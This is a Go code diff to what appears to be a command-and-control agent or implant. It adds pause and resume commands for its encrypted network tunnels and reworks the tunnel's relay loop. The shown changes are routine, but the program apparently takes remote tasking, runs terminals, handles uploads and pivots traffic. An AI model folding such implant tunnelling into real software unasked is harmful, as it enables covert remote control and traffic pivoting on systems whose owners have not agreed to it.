@@ -20,6 +20,7 @@ import (
 	"os/exec"
 	"strconv"
 	"sync"
+	"sync/atomic"
 	"syscall"
 	"time"
 
@@ -31,6 +32,11 @@ var DOWNLOADS map[string]utils.Connection
 var JOBS map[string]utils.Connection
 var TUNNELS sync.Map
 var TERMINALS sync.Map
+
+type TunnelController struct {
+	Cancel context.CancelFunc
+	Paused atomic.Bool
+}
 
 func TaskProcess(commands [][]byte) [][]byte {
 	var (
@@ -116,6 +122,12 @@ func TaskProcess(commands [][]byte) [][]byte {
 
 		case utils.COMMAND_TUNNEL_STOP:
 			taskTunnelKill(command.Data)
+
+		case utils.COMMAND_TUNNEL_PAUSE:
+			taskTunnelPause(command.Data)
+
+		case utils.COMMAND_TUNNEL_RESUME:
+			taskTunnelResume(command.Data)
 
 		case utils.COMMAND_UPLOAD:
 			data, err = taskUpload(command.Data)
@@ -489,9 +501,41 @@ func taskTunnelKill(paramsData []byte) {
 
 	value, ok := TUNNELS.Load(params.ChannelId)
 	if ok {
-		cancel, ok := value.(context.CancelFunc)
+		ctrl, ok := value.(*TunnelController)
 		if ok {
-			cancel()
+			ctrl.Cancel()
+		}
+	}
+}
+
+func taskTunnelPause(paramsData []byte) {
+	var params utils.ParamsTunnelPause
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return
+	}
+
+	value, ok := TUNNELS.Load(params.ChannelId)
+	if ok {
+		ctrl, ok := value.(*TunnelController)
+		if ok {
+			ctrl.Paused.Store(true)
+		}
+	}
+}
+
+func taskTunnelResume(paramsData []byte) {
+	var params utils.ParamsTunnelResume
+	err := msgpack.Unmarshal(paramsData, &params)
+	if err != nil {
+		return
+	}
+
+	value, ok := TUNNELS.Load(params.ChannelId)
+	if ok {
+		ctrl, ok := value.(*TunnelController)
+		if ok {
+			ctrl.Paused.Store(false)
 		}
 	}
 }
@@ -1093,7 +1137,10 @@ func jobTunnel(paramsData []byte) {
 		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}
 
 		ctx, cancel := context.WithCancel(context.Background())
-		TUNNELS.Store(params.ChannelId, cancel)
+		ctrl := &TunnelController{
+			Cancel: cancel,
+		}
+		TUNNELS.Store(params.ChannelId, ctrl)
 		defer TUNNELS.Delete(params.ChannelId)
 
 		var closeOnce sync.Once
@@ -1115,8 +1162,35 @@ func jobTunnel(paramsData []byte) {
 
 		go func() {
 			defer wg.Done()
-			io.Copy(streamWriter, clientConn)
-			closeAll()
+			buf := make([]byte, 32*1024)
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+					if ctrl.Paused.Load() {
+						time.Sleep(50 * time.Millisecond)
+						continue
+					}
+
+					clientConn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+					nr, er := clientConn.Read(buf)
+					if nr > 0 {
+						_, ew := streamWriter.Write(buf[0:nr])
+						if ew != nil {
+							closeAll()
+							return
+						}
+					}
+					if er != nil {
+						if netErr, ok := er.(net.Error); ok && netErr.Timeout() {
+							continue
+						}
+						closeAll()
+						return
+					}
+				}
+			}
 		}()
 
 		go func() {
